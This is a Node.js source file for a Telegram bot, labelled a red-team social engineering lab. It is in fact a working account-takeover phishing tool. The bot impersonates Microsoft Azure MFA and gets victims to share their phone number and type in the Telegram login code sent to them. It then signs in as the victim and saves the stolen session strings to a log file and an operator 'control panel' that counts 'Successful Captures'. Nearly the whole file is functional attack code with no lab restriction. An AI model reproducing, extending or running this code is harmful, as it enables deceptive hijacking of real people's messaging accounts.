/*
 * =====================================================================================
 *
 * Filename:  bot.js
 *
 * Description:  Red Team Social Engineering Simulation Lab v2.0
 * Designed for stability, sophistication, and educational efficacy.
 *
 * Version:  2.0 (Stable Architecture)
 * Created:  2025-09-11
 * Revision:  none
 * Compiler:  node.js v22+
 *
 * Author:  World Class Tech Genius & Security Researcher
 * Organization:  Red Team Operations
 *
 * =====================================================================================
 */

// -------------------------------------------------------------------
// SECTION 1: MODULES & CONFIGURATION
// -------------------------------------------------------------------
const TelegramBot = require('node-telegram-bot-api');
// Import Telegram client components correctly
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const fs = require('fs').promises;
const path = require('path');

// --- ⚠️ PASTE YOUR SECRETS HERE ---
const botToken = 'bot tokem';
const apiId = 'id here'; // Must be a number, not a string (e.g., 1234567)
const apiHash = 'gash here';
const adminChatId = 5413684404; // Admin chat ID for panel access
// ------------------------------------

// Enhanced state management object
const userState = {};
const sessionStats = {
    totalAttempts: 0,
    successfulLogins: 0,
    failedAttempts: 0,
    sessions: [],
    startTime: new Date().toISOString()
};

// Export rate limiting
const exportCooldown = new Map();

// Rate limiting and stability
const rateLimiter = new Map();
const CONNECTION_TIMEOUT = 30000;
const MAX_RETRIES = 3;

// Sophisticated Logging
const log = {
    info: (msg) => console.log(`\x1b[34m[INFO]\x1b[0m ${msg}`),
    success: (msg) => console.log(`\x1b[32m[SUCCESS]\x1b[0m ${msg}`),
    warn: (msg) => console.log(`\x1b[33m[WARN]\x1b[0m ${msg}`),
    error: (msg) => console.error(`\x1b[31m[ERROR]\x1b[0m ${msg}`),
};

const bot = new TelegramBot(botToken, {
    polling: {
        interval: 1000,
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

// Error handling for bot
bot.on('polling_error', (error) => {
    log.error(`Polling error: ${error.message}`);
});

bot.on('error', (error) => {
    log.error(`Bot error: ${error.message}`);
});

log.info('System Initialized. Red Team Lab Bot is operational.');

// -------------------------------------------------------------------
// SECTION 2: UI DEFINITIONS - LEGITIMATE CORPORATE DESIGN
// -------------------------------------------------------------------
const requestPhoneKeyboard = {
    reply_markup: {
        keyboard: [[{ text: "🔐 Verify Identity with Phone Number", request_contact: true }]],
        resize_keyboard: true,
        one_time_keyboard: true,
    },
};

const dialerKeyboard = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '1️⃣', callback_data: '1' }, { text: '2️⃣', callback_data: '2' }, { text: '3️⃣', callback_data: '3' }],
            [{ text: '4️⃣', callback_data: '4' }, { text: '5️⃣', callback_data: '5' }, { text: '6️⃣', callback_data: '6' }],
            [{ text: '7️⃣', callback_data: '7' }, { text: '8️⃣', callback_data: '8' }, { text: '9️⃣', callback_data: '9' }],
            [{ text: '🔄 Clear', callback_data: 'clear' }, { text: '0️⃣', callback_data: '0' }, { text: '✅ Verify', callback_data: 'submit' }]
        ]
    }
};

const adminKeyboard = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '📊 Statistics', callback_data: 'admin_stats' }, { text: '📋 Sessions', callback_data: 'admin_sessions' }],
            [{ text: '📱 Live Monitor', callback_data: 'admin_monitor' }, { text: '🗑️ Clear Logs', callback_data: 'admin_clear' }],
            [{ text: '💾 Export Data', callback_data: 'admin_export' }, { text: '⚙️ Settings', callback_data: 'admin_settings' }]
        ]
    }
};

// -------------------------------------------------------------------
// SECTION 3: CORE LOGIC & AUTOMATED FLOW
// -------------------------------------------------------------------
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    log.info(`New interaction initiated by Chat ID: ${chatId}`);
    log.info(`Admin Chat ID configured as: ${adminChatId}`);
    log.info(`Chat ID type: ${typeof chatId}, Admin ID type: ${typeof adminChatId}`);

    // Check if admin is accessing
    if (chatId === adminChatId) {
        log.info(`Admin access detected for Chat ID: ${chatId}`);
        showAdminPanel(chatId);
        return;
    }

    log.info(`Regular user access for Chat ID: ${chatId}`);
    userState[chatId] = { status: 'AWAITING_PHONE' };
    const welcomeMessage = `🏢 *Microsoft Azure Security Center*\n\n` +
        `🔒 **Multi-Factor Authentication Required**\n\n` +
        `Your organization requires additional verification to access corporate resources. This is part of our Zero Trust security framework.\n\n` +
        `📱 Please verify your identity using your registered mobile number to continue.\n\n` +
        `🛡️ *This process is secure and complies with enterprise security policies.*`;
    bot.sendMessage(chatId, welcomeMessage, { ...requestPhoneKeyboard, parse_mode: 'Markdown' });
});

// Enhanced Admin panel function
function showAdminPanel(chatId) {
    try {
        const uptime = Math.floor((Date.now() - new Date(sessionStats.startTime).getTime()) / 1000 / 60);
        const successRate = sessionStats.totalAttempts > 0 ? ((sessionStats.successfulLogins / sessionStats.totalAttempts) * 100).toFixed(1) : 0;

        const adminMessage = `🔐 *RED TEAM CONTROL PANEL* 🔐\n\n` +
            `⏱️ **System Status:** Online (${uptime}m)\n` +
            `🎯 **Campaign:** Microsoft Azure MFA\n\n` +
            `📊 **Live Statistics:**\n` +
            `├ Total Targets: ${sessionStats.totalAttempts}\n` +
            `├ Successful Captures: ${sessionStats.successfulLogins}\n` +
            `├ Failed Attempts: ${sessionStats.failedAttempts}\n` +
            `└ Success Rate: ${successRate}%\n\n` +
            `📱 **Active Sessions:** ${Object.keys(userState).length}\n` +
            `💾 **Captured Sessions:** ${sessionStats.sessions.filter(s => s.status === 'SUCCESS').length}\n\n` +
            `Use the buttons below to manage the operation:`;

        log.info(`Sending admin panel to Chat ID: ${chatId}`);
        bot.sendMessage(chatId, adminMessage, { ...adminKeyboard, parse_mode: 'Markdown' })
            .then(() => {
                log.success(`Admin panel sent successfully to Chat ID: ${chatId}`);
            })
            .catch((error) => {
                log.error(`Failed to send admin panel: ${error.message}`);
                // Send a simpler message if markdown fails
                bot.sendMessage(chatId, 'RED TEAM CONTROL PANEL\n\nAdmin access granted. Use /stats, /sessions, or /monitor for data.');
            });
    } catch (error) {
        log.error(`Error in showAdminPanel: ${error.message}`);
        bot.sendMessage(chatId, 'Admin panel error. Use /stats for statistics.');
    }
}

// Enhanced admin commands
bot.onText(/\/sessions/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== adminChatId) return;
    showSessionLogs(chatId);
});

bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== adminChatId) return;
    showDetailedStats(chatId);
});

bot.onText(/\/monitor/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== adminChatId) return;
    showLiveMonitor(chatId);
});

// Debug command to check chat ID
bot.onText(/\/whoami/, (msg) => {
    const chatId = msg.chat.id;
    const isAdmin = chatId === adminChatId;
    const message = `Your Chat ID: ${chatId}\nAdmin Chat ID: ${adminChatId}\nAre you admin? ${isAdmin}`;
    bot.sendMessage(chatId, message);
});

// Unified callback handler for both admin and dialer
bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const data = callbackQuery.data;

    // Handle admin callbacks
    if (chatId === adminChatId && data.startsWith('admin_')) {
        await handleAdminCallback(callbackQuery);
        return;
    }

    // Handle regular dialer callbacks
    if (!userState[chatId] || userState[chatId].status !== 'AWAITING_CODE') {
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    let currentCode = userState[chatId].code || '';

    if (data === 'clear') {
        currentCode = '';
        bot.answerCallbackQuery(callbackQuery.id, { text: '🔄 Cleared' });
    }
    else if (data === 'submit') {
        if (currentCode.length < 4) {
            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Code too short', show_alert: true });
            return;
        }
        bot.answerCallbackQuery(callbackQuery.id, { text: '🔍 Verifying...' });
        handleCodeSubmission(chatId, currentCode);
        return;
    } else {
        // Handle number input
        if (currentCode.length < 6) {
            currentCode += data;
            bot.answerCallbackQuery(callbackQuery.id, { text: data });
        } else {
            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Max length reached' });
            return;
        }
    }

    userState[chatId].code = currentCode;

    const maskedCode = currentCode ? '🔢 ' + currentCode.replace(/./g, '● ').trim() : '⬜ Enter verification code';
    const updatedText = `🔐 *Microsoft Azure MFA Verification*\n\n${maskedCode}\n\n📱 Enter the 6-digit code sent to your device`;

    try {
        await bot.editMessageText(updatedText, {
            chat_id: chatId,
            message_id: msg.message_id,
            ...dialerKeyboard,
            parse_mode: 'Markdown'
        });
    } catch (error) {
        // Ignore edit errors to prevent crashes
        log.warn(`Failed to edit message: ${error.message}`);
    }
});

bot.on('contact', async (msg) => {
    const chatId = msg.chat.id;
    if (!userState[chatId] || userState[chatId].status !== 'AWAITING_PHONE') {
        return log.warn(`Received contact from Chat ID ${chatId} in an invalid state.`);
    }

    const phoneNumber = msg.contact.phone_number.startsWith('+') ? msg.contact.phone_number : `+${msg.contact.phone_number}`;
    log.info(`Contact received from ${chatId}. Phone: ${phoneNumber}. Initiating login sequence.`);

    // Increment total attempts
    sessionStats.totalAttempts++;

    bot.sendMessage(chatId, ` Thank you. A one-time passcode is being dispatched to your Telegram account for number **${phoneNumber}**.`, { parse_mode: 'Markdown' });

    Object.assign(userState[chatId], {
        status: 'AWAITING_CODE',
        phoneNumber: phoneNumber,
        client: null,
        code: '',
        startTime: new Date()
    });

    // StringSession and TelegramClient are already imported at the top

    const stringSession = new StringSession('');
    const client = new TelegramClient(stringSession, apiId, apiHash, { connectionRetries: 5 });
    userState[chatId].client = client;

    try {
        // Connect and start the authentication process
        await client.connect();

        // Send code request
        const { phoneCodeHash } = await client.sendCode({
            apiId: apiId,
            apiHash: apiHash
        }, phoneNumber);

        // Store the phone code hash for later use
        userState[chatId].phoneCodeHash = phoneCodeHash;

        log.success(`Passcode dispatched to ${phoneNumber}. Awaiting user submission.`);
        await bot.sendMessage(chatId, `Passcode sent. Please input the code below.`, { reply_markup: { remove_keyboard: true } });
        await bot.sendMessage(chatId, `Enter Passcode:`, dialerKeyboard);

    } catch (error) {
        log.error(`Failed to initiate login for ${phoneNumber}: ${error.message}`);
        await bot.sendMessage(chatId, `Authentication gateway error. Please contact support.`);
    }
});



async function handleCodeSubmission(chatId, code) {
    const state = userState[chatId];
    if (!state || !state.client || state.status !== 'AWAITING_CODE') {
        log.warn(`Code submission attempt from Chat ID ${chatId} in an invalid state.`);
        return;
    }

    bot.sendMessage(chatId, "⏳ Authenticating passcode...", { parse_mode: 'Markdown' });
    const { client, phoneNumber, phoneCodeHash } = state;

    try {
        // Use the correct method for signing in with code
        const result = await client.invoke(
            new Api.auth.SignIn({
                phoneNumber: phoneNumber,
                phoneCodeHash: phoneCodeHash,
                phoneCode: code
            })
        );

        state.status = 'COMPLETED';
        const sessionString = client.session.save();
        log.success(`SESSION CAPTURED for ${phoneNumber}. Target ID: ${chatId}`);

        // Save session to subdolog.txt
        await saveSessionToFile(phoneNumber, sessionString, chatId);

        // Update stats
        sessionStats.successfulLogins++;
        sessionStats.sessions.push({
            phone: phoneNumber,
            status: 'SUCCESS',
            timestamp: new Date().toISOString(),
            chatId: chatId,
            sessionString: sessionString
        });

        const successMessage = ` *Authentication Successful.*\n\nYour enterprise account is now synchronized.\n\n*(Wait for 1-2 Hour for Processing .)*`;
        bot.sendMessage(chatId, successMessage, { parse_mode: 'Markdown' });

    } catch (error) {
        log.error(`Code submission failed for ${phoneNumber}: ${error.message}`);

        // Update stats
        sessionStats.failedAttempts++;
        sessionStats.sessions.push({
            phone: phoneNumber,
            status: 'FAILED',
            timestamp: new Date().toISOString(),
            chatId: chatId,
            error: error.message
        });

        bot.sendMessage(chatId, " *Authentication Failed.*\nThe passcode is invalid or has expired. Please /start the process again.", { parse_mode: 'Markdown' });
        state.status = 'FAILED';
    } finally {
        if (client.connected) {
            await client.disconnect();
            log.info(`Client connection terminated for ${phoneNumber}.`);
        }
        delete userState[chatId]; // Clean up state
    }
}

// Function to save session to subdolog.txt
async function saveSessionToFile(phoneNumber, sessionString, chatId) {
    try {
        const logEntry = `[${new Date().toISOString()}] Phone: ${phoneNumber} | Chat ID: ${chatId} | Session: ${sessionString}\n`;
        await fs.appendFile('subdolog.txt', logEntry);
        log.success(`Session saved to subdolog.txt for ${phoneNumber}`);
    } catch (error) {
        log.error(`Failed to save session to file: ${error.message}`);
    }
}

// Admin callback handler function
async function handleAdminCallback(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    try {
        switch (data) {
            case 'admin_stats':
                await showDetailedStats(chatId);
                break;
            case 'admin_sessions':
                await showSessionLogs(chatId);
                break;
            case 'admin_monitor':
                await showLiveMonitor(chatId);
                break;
            case 'admin_clear':
                sessionStats.sessions = [];
                sessionStats.totalAttempts = 0;
                sessionStats.successfulLogins = 0;
                sessionStats.failedAttempts = 0;
                bot.sendMessage(chatId, '🗑️ Logs cleared successfully');
                break;
            case 'admin_export':
                await exportSessionData(chatId);
                break;
            case 'admin_settings':
                bot.sendMessage(chatId, '⚙️ Settings panel - Feature coming soon');
                break;
        }
        bot.answerCallbackQuery(callbackQuery.id);
    } catch (error) {
        log.error(`Admin callback error: ${error.message}`);
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Error occurred' });
    }
}

// Admin helper functions
async function showDetailedStats(chatId) {
    const uptime = Math.floor((Date.now() - new Date(sessionStats.startTime).getTime()) / 1000 / 60);
    const successRate = sessionStats.totalAttempts > 0 ? ((sessionStats.successfulLogins / sessionStats.totalAttempts) * 100).toFixed(1) : 0;

    const statsMessage = `📊 *DETAILED STATISTICS*\n\n` +
        `⏱️ **Uptime:** ${uptime} minutes\n` +
        `🎯 **Total Attempts:** ${sessionStats.totalAttempts}\n` +
        `✅ **Successful:** ${sessionStats.successfulLogins}\n` +
        `❌ **Failed:** ${sessionStats.failedAttempts}\n` +
        `📈 **Success Rate:** ${successRate}%\n` +
        `🔄 **Active Sessions:** ${Object.keys(userState).length}`;

    bot.sendMessage(chatId, statsMessage, { parse_mode: 'Markdown' });
}

async function showSessionLogs(chatId) {
    if (sessionStats.sessions.length === 0) {
        bot.sendMessage(chatId, '📋 No sessions recorded yet');
        return;
    }

    const recentSessions = sessionStats.sessions.slice(-10);
    let logMessage = '📋 *RECENT SESSIONS*\n\n';

    recentSessions.forEach((session, index) => {
        const time = new Date(session.timestamp).toLocaleTimeString();
        const status = session.status === 'SUCCESS' ? '✅' : '❌';
        logMessage += `${status} ${session.phone} - ${time}\n`;
    });

    bot.sendMessage(chatId, logMessage, { parse_mode: 'Markdown' });
}

async function showLiveMonitor(chatId) {
    const activeUsers = Object.keys(userState).length;
    const monitorMessage = `📱 *LIVE MONITOR*\n\n` +
        `🔴 **Active Targets:** ${activeUsers}\n` +
        `⚡ **System Status:** Operational\n` +
        `🌐 **Bot Status:** Online\n\n` +
        `*Real-time monitoring active...*`;

    bot.sendMessage(chatId, monitorMessage, { parse_mode: 'Markdown' });
}

async function exportSessionData(chatId) {
    try {
        // Rate limiting - prevent multiple exports within 30 seconds
        const now = Date.now();
        const lastExport = exportCooldown.get(chatId) || 0;
        if (now - lastExport < 30000) {
            const remainingTime = Math.ceil((30000 - (now - lastExport)) / 1000);
            bot.sendMessage(chatId, `⏳ Please wait ${remainingTime} seconds before exporting again`);
            return;
        }
        exportCooldown.set(chatId, now);

        // Create exports directory if it doesn't exist
        const exportsDir = 'exports';
        try {
            await fs.access(exportsDir);
        } catch {
            await fs.mkdir(exportsDir);
        }

        const exportData = {
            stats: sessionStats,
            exportTime: new Date().toISOString(),
            activeUsers: Object.keys(userState).length,
            exportedBy: chatId
        };

        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = path.join(exportsDir, `session_export_${timestamp}.json`);

        await fs.writeFile(filename, JSON.stringify(exportData, null, 2));
        log.success(`Export created: ${filename}`);

        // Send as document with proper content type
        await bot.sendDocument(chatId, filename, {
            caption: '💾 Session data exported successfully',
            filename: `session_export_${timestamp}.json`
        }, {
            contentType: 'application/json'
        });

        // Clean up old exports (keep only last 5)
        await cleanupOldExports(exportsDir);

    } catch (error) {
        log.error(`Export failed: ${error.message}`);
        bot.sendMessage(chatId, '❌ Export failed: ' + error.message);
    }
}

// Clean up old export files
async function cleanupOldExports(exportsDir) {
    try {
        const files = await fs.readdir(exportsDir);
        const exportFiles = files
            .filter(file => file.startsWith('session_export_') && file.endsWith('.json'))
            .map(file => ({
                name: file,
                path: path.join(exportsDir, file),
                time: file.match(/session_export_(.+)\.json/)?.[1] || ''
            }))
            .sort((a, b) => b.time.localeCompare(a.time));

        // Keep only the 5 most recent exports
        if (exportFiles.length > 5) {
            const filesToDelete = exportFiles.slice(5);
            for (const file of filesToDelete) {
                await fs.unlink(file.path);
                log.info(`Cleaned up old export: ${file.name}`);
            }
        }
    } catch (error) {
        log.warn(`Failed to cleanup old exports: ${error.message}`);
    }
}